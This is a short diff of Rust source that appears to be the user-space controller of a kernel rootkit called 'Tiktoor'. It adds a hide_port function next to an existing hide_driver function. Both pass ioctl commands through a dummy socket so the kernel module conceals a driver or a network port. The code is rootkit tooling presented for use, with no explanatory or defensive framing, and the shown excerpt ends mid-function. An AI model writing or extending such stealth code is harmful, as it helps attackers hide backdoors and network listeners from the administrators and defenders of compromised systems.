@@ -1,4 +1,4 @@
-use libc::{c_char, c_uchar, c_uint, c_ulong, c_void, AF_INET, SOCK_STREAM};
+use libc::{c_char, c_uchar, c_uint, c_ulong, c_ushort, c_void, AF_INET, SOCK_STREAM};
 use std::ffi::CString;
 use std::ptr;
 
@@ -61,6 +61,32 @@ pub fn hide_driver(name: &CString) {
     };
     let cmd_arg = TiktoorCmdArg {
         action: Action::DriverHiding as c_uchar,
+        subargs: &subargs as *const _ as *const c_void,
+    };
+    unsafe {
+        let dummy_socket = libc::socket(AF_INET, SOCK_STREAM, 6);
+        libc::ioctl(
+            dummy_socket,
+            TIKTOOR_IOCTL_CMD,
+            &cmd_arg as *const _ as *const c_void,
+        );
+    }
+}
+
+#[repr(C)]
+struct PortHidingSubargs {
+    transmission_type: c_uchar,
+    port: c_ushort,
+}
+
+/// Hide port
+pub fn hide_port(transmission_type: u8, port: u16) {
+    let subargs = PortHidingSubargs {
+        transmission_type,
+        port,
+    };
+    let cmd_arg = TiktoorCmdArg {
+        action: Action::PortHiding as c_uchar,
         subargs: &subargs as *const _ as *const c_void,
     };
     unsafe {
